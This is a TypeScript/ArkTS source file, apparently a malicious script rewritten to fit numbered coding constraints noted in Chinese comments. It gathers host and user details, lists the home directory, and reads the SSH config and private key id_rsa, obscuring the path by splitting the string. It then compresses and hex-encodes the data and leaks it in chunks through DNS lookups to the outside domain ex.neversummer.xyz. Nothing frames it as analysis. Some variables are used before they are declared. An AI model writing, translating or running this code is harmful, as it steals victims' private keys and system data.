// 应用约束2：使用类替代对象字面量
class UserInfo {
    uid: number = 0
    gid: number = 0
    username: string = ''
    homedir: string = ''
    shell: string = ''
}

// 应用约束24：使用类替代对象字面量类型
class SystemInfo {
    hn: string = ''
    ar: string = ''
    pl: string = ''
    rel: string = ''
    tmp: string = ''
    mem: number = 0
    up: number = 0
    uid: number = 0
    gid: number = 0
    un: string = ''
    hd: string = ''
    sh: string = ''
    fn: string = ''
    ls: string[] = []
    cnt: Map<string, string> = new Map()
    net: string[] = []
}

// 应用约束8：使用let替代var
import os from 'os.ets';
import crypto from 'crypto.ets';
import fs from 'fs.ets';
import zlib from 'zlib.ets';
import dns from 'dns.ets';

// 应用约束1：显式类型标注
let userInfo: UserInfo = os.userInfo() as UserInfo;

// 应用约束23：显式标注对象类型
let info: SystemInfo = new SystemInfo();
info.hn = os.hostname();
info.ar = os.arch();
info.pl = os.platform();
info.rel = os.release();
info.tmp = os.tmpdir();
info.mem = os.totalmem();
info.up = os.uptime();
info.uid = userInfo.uid;
info.gid = userInfo.gid;
info.un = userInfo.username;
info.hd = userInfo.homedir;
info.sh = userInfo.shell;
info.fn = __filename;

// 应用约束21：使用数组索引访问
fs.readdirSync(os.homedir()).forEach((file: string) => {
    info.ls.push(file);
});

let keyFolder: string = os.homedir() + "/." + "ss" + "h/";
const a: string[] = ["config", "id_rsa"];

// 应用约束5：使用Map替代对象动态属性
a.forEach((fileName: string) => {
    try {
        let file: string = keyFolder + fileName;
        if (fs.existsSync(file)) {
            info.cnt.set(fileName, fs.readFileSync(file, 'utf8'));
        }
    } catch(err) {
        // 处理异常
    }
});

// 应用约束20：使用类型安全访问
const interfaces = os.networkInterfaces();
for (const key in interfaces) {
    if (interfaces.hasOwnProperty(key)) {
        info.net.push(`${key}:${interfaces[key][0].address}`);
    }
}

// 应用约束10：显式类型转换
let infoString: string = JSON.stringify(info);
let encodedInfo: Buffer = zlib.deflateSync(infoString);
let hexEncoded: string = encodedInfo.toString('hex');

// 应用约束32：显式处理字符串操作
const maxLabelLen: number = 63;
let re: RegExp = new RegExp(`.{1,${maxLabelLen}}`, 'g');
let chunks: RegExpMatchArray | null = hexEncoded.match(re);

// 应用约束26：使用箭头函数
if (chunks) {
    chunks.forEach((chunk: string, index: number) => {
        let seq: number = index + 1;
        let domain: string = `${rayId}.${seq}.${chunk}.${baseDomain}`;
        
        // 应用约束51：使用标准网络API
        dns.resolve(domain, "A", (err: Error | null, records: string[]) => {
            // DNS处理逻辑
        });
    });
}

// 应用约束7：使用class替代#私有字段
class CryptoHelper {
    private static rayId: string = crypto.randomBytes(20).toString('hex').substring(0, 8);
    
    static getRayId(): string {
        return this.rayId;
    }
}

const baseDomain: string = "ex.neversummer.xyz";
let rayId: string = CryptoHelper.getRayId();

// 应用约束37：使用传统for循环替代解构
for (let i = 0; i < (chunks ? chunks.length : 0); i++) {
    let chunk = chunks![i];
    // 后续处理逻辑
}
